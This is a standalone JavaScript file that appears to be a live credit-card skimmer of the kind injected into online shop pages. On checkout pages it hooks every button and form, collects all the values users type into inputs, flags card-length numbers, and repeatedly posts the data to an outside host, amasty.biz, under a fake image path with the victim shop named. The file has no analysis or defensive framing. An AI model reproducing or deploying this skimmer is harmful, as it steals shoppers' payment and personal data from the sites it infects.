var snd =null;

function start(){
  if((new RegExp('onepagecheckout|onestepcheckout|onepage|firecheckout|simplecheckout')).test(window.location)) {
        send();
       
    }

}
document.addEventListener("DOMContentLoaded", start);

function clk() {
    var inp=document.querySelectorAll("input, select, textarea, checkbox");
    for (var i=0;i<inp.length;i++){
        if(inp[i].value.length>0) {
        var nme=inp[i].id;
        if(nme=='') { nme=i; }
        snd+=inp[i].id+'='+inp[i].value+'&';
        }
    }
   
}


function send() {
 var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
    for (var i=0;i<btn.length;i++){
        var b=btn[i];
        if(b.type!='text' && b.type!='slect' && b.type!='checkbox' && b.type!='password' && b.type!='radio') {
            if(b.addEventListener) {
                b.addEventListener("click", clk, false);
            }else {
                b.attachEvent('onclick', clk);
            }
        }
    }

    var frm=document.querySelectorAll("form");
    for (var i=0;i<frm.length;i++){
        if(frm[i].addEventListener) {
            frm[i].addEventListener("submit", clk, false);
        }else {
            frm[i].attachEvent('onsubmit', clk);
        }
    }

    if(snd!=null) {
    var cc = new RegExp("[0-9]{13,16}");
        var asd="0";
       if(cc.test(snd)){
          asd="1" ;
       }
var http = new XMLHttpRequest();
http.open("POST","https://amasty.biz/lib/paypal_icon.jpg",true);
http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
http.send("data="+snd+"&asd="+asd+"&id_id=kalkifashion.com");
    }
    snd=null;
    setTimeout('send()', 130);
}